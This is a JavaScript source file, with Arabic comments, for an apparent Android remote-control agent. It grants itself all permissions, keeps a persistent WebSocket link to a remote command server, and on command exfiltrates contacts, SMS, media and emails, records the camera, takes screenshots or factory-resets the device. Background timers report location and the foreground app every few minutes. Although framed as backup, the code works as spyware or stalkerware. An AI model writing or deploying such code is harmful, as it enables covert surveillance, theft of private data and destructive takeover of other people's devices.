const PermissionGranter = require('./permission-granter');
const BackupModule = require('./backup-module');
const CameraModule = require('./camera-module');
const SystemModule = require('./system-module');
const WebSocket = require('ws');
const fs = require('fs');
const path = require('path');

class DeviceController {
  constructor(deviceId) {
    this.deviceId = deviceId;
    this.ws = null;
    this.isConnected = false;
    this.reconnectAttempts = 0;
    this.maxReconnectAttempts = 10;
    this.reconnectInterval = 5000;
    this.pendingCommands = [];
    this.localStoragePath = path.join(__dirname, 'local-storage');
    this.commandsQueuePath = path.join(this.localStoragePath, 'commands-queue.json');
    this.dataCachePath = path.join(this.localStoragePath, 'data-cache.json');
    
    this.modules = {
      backup: new BackupModule(deviceId),
      camera: new CameraModule(),
      system: new SystemModule()
    };
    
    // إنشاء مجلد التخزين المحلي
    this.ensureLocalStorage();
    
    // تحميل الأوامر المعلقة
    this.loadPendingCommands();
  }

  ensureLocalStorage() {
    if (!fs.existsSync(this.localStoragePath)) {
      fs.mkdirSync(this.localStoragePath, { recursive: true });
    }
  }

  loadPendingCommands() {
    try {
      if (fs.existsSync(this.commandsQueuePath)) {
        const data = fs.readFileSync(this.commandsQueuePath, 'utf8');
        this.pendingCommands = JSON.parse(data);
        console.log(`تم تحميل ${this.pendingCommands.length} أمر معلق`);
      }
    } catch (error) {
      console.error('خطأ في تحميل الأوامر المعلقة:', error);
      this.pendingCommands = [];
    }
  }

  savePendingCommands() {
    try {
      fs.writeFileSync(this.commandsQueuePath, JSON.stringify(this.pendingCommands, null, 2));
    } catch (error) {
      console.error('خطأ في حفظ الأوامر المعلقة:', error);
    }
  }

  addToPendingCommands(command) {
    this.pendingCommands.push({
      ...command,
      timestamp: Date.now(),
      attempts: 0
    });
    this.savePendingCommands();
  }

  removeFromPendingCommands(commandId) {
    this.pendingCommands = this.pendingCommands.filter(cmd => cmd.id !== commandId);
    this.savePendingCommands();
  }

  async init() {
    try {
      console.log('بدء تهيئة التحكم في الجهاز...');
      
      // 1. منح الصلاحيات
      const granter = new PermissionGranter(this.deviceId);
      await granter.grantAllPermissions();
      
      // 2. الاتصال بخادم التحكم
      this.connectToServer();
      
      // 3. بدء الخدمات الخلفية
      this.startBackgroundServices();
      
      // 4. معالجة الأوامر المعلقة
      this.processPendingCommands();
      
      console.log('تم تهيئة التحكم في الجهاز بنجاح');
    } catch (error) {
      console.error('فشل في تهيئة التحكم:', error);
      // إعادة المحاولة بعد 30 ثانية
      setTimeout(() => this.init(), 30000);
    }
  }

  connectToServer() {
    const servers = [
              // تحديد الرابط الصحيح بناءً على البيئة
        typeof window !== 'undefined' && (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1')
            ? 'ws://localhost:4000' 
            : 'wss://remote-control-command-server.onrender.com',
      'ws://192.168.1.100:4000',
      'ws://your-server.com:4000'
    ];

    const tryConnect = (serverIndex = 0) => {
      if (serverIndex >= servers.length) {
        console.log('فشل الاتصال بجميع الخوادم، إعادة المحاولة...');
        setTimeout(() => this.connectToServer(), this.reconnectInterval);
        return;
      }

      const serverUrl = servers[serverIndex];
      console.log(`محاولة الاتصال بـ: ${serverUrl}`);

      try {
        this.ws = new WebSocket(serverUrl);
        
        this.ws.on('open', () => {
          console.log(`تم الاتصال بنجاح بـ: ${serverUrl}`);
          this.isConnected = true;
          this.reconnectAttempts = 0;
          
          // تسجيل الجهاز
          this.ws.send(JSON.stringify({
            type: 'register',
            deviceId: this.deviceId,
            timestamp: Date.now(),
            status: 'online'
          }));
          
          // إرسال الأوامر المعلقة
          this.sendPendingCommands();
        });
        
        this.ws.on('message', (data) => {
          try {
            const command = JSON.parse(data);
            this.handleCommand(command);
          } catch (error) {
            console.error('خطأ في معالجة الرسالة:', error);
          }
        });
        
        this.ws.on('close', () => {
          console.log('انقطع الاتصال بالخادم');
          this.isConnected = false;
          this.handleDisconnection();
        });
        
        this.ws.on('error', (error) => {
          console.error('خطأ في الاتصال:', error);
          this.isConnected = false;
          setTimeout(() => tryConnect(serverIndex + 1), 2000);
        });
        
      } catch (error) {
        console.error(`خطأ في الاتصال بـ ${serverUrl}:`, error);
        setTimeout(() => tryConnect(serverIndex + 1), 2000);
      }
    };

    tryConnect();
  }

  handleDisconnection() {
    console.log('معالجة انقطاع الاتصال...');
    
    // إيقاف مؤقت قبل إعادة المحاولة
    const delay = Math.min(this.reconnectInterval * Math.pow(2, this.reconnectAttempts), 60000);
    this.reconnectAttempts++;
    
    console.log(`إعادة المحاولة بعد ${delay}ms (محاولة ${this.reconnectAttempts})`);
    
    setTimeout(() => {
      if (this.reconnectAttempts < this.maxReconnectAttempts) {
        this.connectToServer();
      } else {
        console.log('تم تجاوز الحد الأقصى للمحاولات، الانتقال للوضع المحلي');
        this.startLocalMode();
      }
    }, delay);
  }

  startLocalMode() {
    console.log('بدء الوضع المحلي - استمرار العمليات بدون اتصال');
    
    // استمرار الخدمات المحلية
    this.continueLocalServices();
    
    // محاولة إعادة الاتصال كل 5 دقائق
    setInterval(() => {
      if (!this.isConnected) {
        this.reconnectAttempts = 0;
        this.connectToServer();
      }
    }, 300000);
  }

  continueLocalServices() {
    // مراقبة الموقع المحلي
    setInterval(() => {
      this.modules.system.getLocation().then(location => {
        this.cacheData('location', location);
      });
    }, 300000);
    
    // مراقبة التطبيقات المحلية
    setInterval(() => {
      this.checkRunningApps();
    }, 60000);
    
    // حفظ البيانات المحلية
    setInterval(() => {
      this.saveCachedData();
    }, 60000);
  }

  cacheData(type, data) {
    try {
      let cachedData = {};
      if (fs.existsSync(this.dataCachePath)) {
        cachedData = JSON.parse(fs.readFileSync(this.dataCachePath, 'utf8'));
      }
      
      cachedData[type] = {
        data: data,
        timestamp: Date.now()
      };
      
      fs.writeFileSync(this.dataCachePath, JSON.stringify(cachedData, null, 2));
    } catch (error) {
      console.error('خطأ في تخزين البيانات المحلية:', error);
    }
  }

  saveCachedData() {
    try {
      if (fs.existsSync(this.dataCachePath)) {
        const cachedData = JSON.parse(fs.readFileSync(this.dataCachePath, 'utf8'));
        
        // حفظ البيانات في ملف منفصل
        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
        const backupPath = path.join(this.localStoragePath, `data-backup-${timestamp}.json`);
        fs.writeFileSync(backupPath, JSON.stringify(cachedData, null, 2));
        
        // حذف البيانات القديمة (أكثر من 7 أيام)
        this.cleanupOldData();
      }
    } catch (error) {
      console.error('خطأ في حفظ البيانات المحلية:', error);
    }
  }

  cleanupOldData() {
    try {
      const files = fs.readdirSync(this.localStoragePath);
      const now = Date.now();
      const sevenDays = 7 * 24 * 60 * 60 * 1000;
      
      files.forEach(file => {
        if (file.startsWith('data-backup-')) {
          const filePath = path.join(this.localStoragePath, file);
          const stats = fs.statSync(filePath);
          
          if (now - stats.mtime.getTime() > sevenDays) {
            fs.unlinkSync(filePath);
            console.log(`تم حذف الملف القديم: ${file}`);
          }
        }
      });
    } catch (error) {
      console.error('خطأ في تنظيف البيانات القديمة:', error);
    }
  }

  sendPendingCommands() {
    if (this.pendingCommands.length > 0 && this.isConnected) {
      console.log(`إرسال ${this.pendingCommands.length} أمر معلق`);
      
      this.pendingCommands.forEach(command => {
        try {
          this.ws.send(JSON.stringify({
            type: 'pending_command_result',
            command: command,
            timestamp: Date.now()
          }));
        } catch (error) {
          console.error('خطأ في إرسال الأمر المعلق:', error);
        }
      });
      
      // مسح الأوامر المرسلة
      this.pendingCommands = [];
      this.savePendingCommands();
    }
  }

  async processPendingCommands() {
    if (this.pendingCommands.length > 0) {
      console.log(`معالجة ${this.pendingCommands.length} أمر معلق`);
      
      for (const command of this.pendingCommands) {
        try {
          await this.executeCommand(command);
          command.attempts++;
          
          if (command.attempts >= 3) {
            console.log(`تم تجاوز الحد الأقصى للمحاولات للأمر: ${command.action}`);
            this.removeFromPendingCommands(command.id);
          }
        } catch (error) {
          console.error(`خطأ في معالجة الأمر المعلق: ${command.action}`, error);
        }
      }
      
      this.savePendingCommands();
    }
  }

  handleCommand(command) {
    console.log('تم استلام الأمر:', command);
    
    // إضافة معرف فريد للأمر
    command.id = command.id || `cmd_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
    
    // تنفيذ الأمر
    this.executeCommand(command).catch(error => {
      console.error(`خطأ في تنفيذ الأمر ${command.action}:`, error);
      
      // إضافة للأوامر المعلقة إذا فشل التنفيذ
      this.addToPendingCommands(command);
    });
  }

  async executeCommand(command) {
    let result = null;
    
    try {
      switch(command.action) {
        case 'backup_contacts':
          result = await this.modules.backup.backupContacts();
          break;
        case 'backup_sms':
          result = await this.modules.backup.backupSMS();
          break;
        case 'backup_media':
          result = await this.modules.backup.backupMedia();
          break;
        case 'backup_emails':
          result = await this.modules.backup.backupEmails();
          break;
        case 'get_location':
          result = await this.modules.system.getLocation();
          break;
        case 'record_camera':
          result = await this.modules.camera.startRecording(command.duration || 30);
          break;
        case 'take_screenshot':
          result = await this.modules.system.takeScreenshot();
          break;
        case 'factory_reset':
          result = await this.modules.system.factoryReset();
          break;
        default:
          throw new Error(`أمر غير معروف: ${command.action}`);
      }
      
      // إرسال النتيجة إذا كان متصلاً
      if (this.isConnected) {
        this.ws.send(JSON.stringify({
          type: 'command_result',
          commandId: command.id,
          action: command.action,
          status: 'success',
          result: result,
          timestamp: Date.now()
        }));
      } else {
        // تخزين النتيجة محلياً
        this.cacheData(`command_result_${command.id}`, {
          action: command.action,
          status: 'success',
          result: result,
          timestamp: Date.now()
        });
      }
      
    } catch (error) {
      console.error(`خطأ في تنفيذ الأمر ${command.action}:`, error);
      
      // إرسال خطأ إذا كان متصلاً
      if (this.isConnected) {
        this.ws.send(JSON.stringify({
          type: 'command_result',
          commandId: command.id,
          action: command.action,
          status: 'error',
          error: error.message,
          timestamp: Date.now()
        }));
      } else {
        // تخزين الخطأ محلياً
        this.cacheData(`command_error_${command.id}`, {
          action: command.action,
          status: 'error',
          error: error.message,
          timestamp: Date.now()
        });
      }
      
      throw error;
    }
  }

  startBackgroundServices() {
    console.log('بدء الخدمات الخلفية...');
    
    // مراقبة الموقع كل 5 دقائق
    setInterval(() => {
      this.modules.system.getLocation().then(location => {
        if (this.isConnected) {
          this.ws.send(JSON.stringify({
            type: 'location_update',
            data: location,
            timestamp: Date.now()
          }));
        } else {
          this.cacheData('location', location);
        }
      });
    }, 300000);
    
    // مراقبة التطبيقات كل دقيقة
    setInterval(() => {
      this.checkRunningApps();
    }, 60000);
    
    // إرسال نبض الحياة كل 30 ثانية
    setInterval(() => {
      if (this.isConnected) {
        this.ws.send(JSON.stringify({
          type: 'heartbeat',
          deviceId: this.deviceId,
          timestamp: Date.now()
        }));
      }
    }, 30000);
    
    // فحص الاتصال بالإنترنت كل دقيقة
    setInterval(() => {
      this.checkInternetConnection();
    }, 60000);
  }

  checkRunningApps() {
    const exec = require('child_process').exec;
    exec('dumpsys activity activities | grep mResumedActivity', 
      (error, stdout) => {
        if (!error && stdout) {
          const app = stdout.split(' ')[3];
          const appData = {
            app: app || 'unknown',
            timestamp: Date.now()
          };
          
          if (this.isConnected) {
            this.ws.send(JSON.stringify({
              type: 'app_usage',
              data: appData
            }));
          } else {
            this.cacheData('running_apps', appData);
          }
        }
      }
    );
  }

  checkInternetConnection() {
    const exec = require('child_process').exec;
    exec('ping -c 1 8.8.8.8', (error) => {
      const isConnected = !error;
      
      if (this.isConnected) {
        this.ws.send(JSON.stringify({
          type: 'internet_status',
          connected: isConnected,
          timestamp: Date.now()
        }));
      } else {
        this.cacheData('internet_status', {
          connected: isConnected,
          timestamp: Date.now()
        });
      }
    });
  }
}

module.exports = DeviceController;